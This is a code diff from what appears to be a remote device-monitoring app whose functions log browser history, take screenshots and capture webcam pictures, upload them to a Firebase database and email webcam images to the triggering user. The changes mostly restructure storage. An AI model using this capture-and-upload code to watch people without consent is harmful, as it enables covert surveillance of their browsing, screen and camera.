@@ -218,7 +218,7 @@ function logBrowsersHistory() {
                 if (!(_.find(browserHistoryList, { hash: hash(entry) }))) {
                     entry.hash = hash(entry);
                     browserHistoryList.push(entry);
-                     firebase.database().ref(DEVICES_NODE).child(DbNodeReference).push().set(entry, (err: any) => {
+                    firebase.database().ref(DEVICES_NODE).child(DbNodeReference).push().set(entry, (err: any) => {
                         if (err) {
                             logEvent('Database Set Error', err);
                         }
@@ -244,7 +244,7 @@ function takeScreenshot(key: string) {
         currentScreenshot.Status = ImageStatus.UNREAD;
         currentScreenshot.CreationDateTime = currentDateTime;
         currentScreenshot.ImageName = 'Screenshot@' + currentDateTime;
-        firebase.database().ref(DEVICES_NODE).child(DbNodeReference).child(getCurrentDateTime(true, false)).push().set(currentScreenshot, (err: any) => {
+        firebase.database().ref(DEVICES_NODE).child(DbNodeReference).child(getCurrentDateTime(true, false)).push().set({ data: currentScreenshot, key }, (err: any) => {
             if (err) {
                 onTriggerComplete(key, TriggerStatus.FAILED);
                 logEvent('Database Set Error', err);
@@ -292,6 +292,7 @@ function sendUserEmail(to: Array<string>, subject: string, text: any = null, htm
 }
 
 function takePicture(key: string) {
+    const DbNodeReference = state.uuid + '/Webcam';
     sysInfo.graphics().then((info) => {
         const width = info.displays[0].sizex;
         const height = info.displays[0].sizey;
@@ -314,14 +315,22 @@ function takePicture(key: string) {
             }
             if (data) {
                 // send to firebase
-                const trigger: Trigger = hashMap.get(key);
-                const currentTimeDate = getCurrentDateTime();
-                sendUserEmail(
-                    [trigger.User.email],
-                    'Webcam ' + currentTimeDate,
-                    'Webcam Picture Taken by ' + trigger.User.name,
-                    [{ filename: 'webcam' + currentTimeDate + '.jpg', content: data.replace('data:image/jpeg;base64,', ''), contentId: 'webcam' + currentTimeDate }]);
-                onTriggerComplete(key, TriggerStatus.SUCCESS);
+                firebase.database().ref(DEVICES_NODE).child(DbNodeReference).child(getCurrentDateTime(true, false)).push().set({ data, key }, (err: any) => {
+                    if (err) {
+                        onTriggerComplete(key, TriggerStatus.FAILED);
+                        logEvent('Database Set Error', err);
+                    } else {
+                        const trigger: Trigger = hashMap.get(key);
+                        const currentTimeDate = getCurrentDateTime();
+                        sendUserEmail(
+                            [trigger.User.email],
+                            'Webcam ' + currentTimeDate,
+                            'Webcam Picture Taken by ' + trigger.User.name,
+                            [{ filename: 'webcam' + currentTimeDate + '.jpg', content: data.replace('data:image/jpeg;base64,', ''), contentId: 'webcam' + currentTimeDate }]);
+                        onTriggerComplete(key, TriggerStatus.SUCCESS);
+                    }
+                });
+
             }
         });
     }).catch((err) => {
